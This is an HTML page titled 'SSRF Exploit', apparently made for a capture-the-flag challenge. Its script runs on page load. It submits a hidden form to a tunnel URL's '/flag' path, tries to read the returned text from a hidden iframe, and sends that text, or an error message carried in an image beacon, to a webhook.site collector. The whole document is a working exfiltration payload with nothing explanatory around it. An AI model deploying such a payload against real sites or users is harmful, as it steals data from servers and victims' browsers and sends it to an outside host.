<!DOCTYPE html>
<html>
<head>
    <title>SSRF Exploit</title>
</head>
<body>
    <script>
        // Method 1: Using form submission
        function exploitWithForm() {
            const form = document.createElement('form');
            form.method = 'GET';
            form.action = 'https://tar-award-writers-controllers.trycloudflare.com/flag';
            form.target = 'hiddenFrame';
            document.body.appendChild(form);
            
            const frame = document.createElement('iframe');
            frame.name = 'hiddenFrame';
            frame.style.display = 'none';
            document.body.appendChild(frame);
            
            form.submit();
            
            // Wait for iframe to load and try to read content
            setTimeout(() => {
                try {
                    const iframeDoc = frame.contentDocument || frame.contentWindow.document;
                    const flag = iframeDoc.body.innerText;
                    
                    // Send to webhook
                    fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
                        method: 'POST',
                        headers: {'Content-Type': 'text/plain'},
                        body: 'Flag via form: ' + flag
                    });
                } catch (e) {
                    // If we can't read directly, use image beacon
                    const img = new Image();
                    img.src = 'https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0?flag=form_attempt&error=' + encodeURIComponent(e.message);
                }
            }, 2000);
        }
        
        exploitWithForm();
    </script>
</body>
</html>
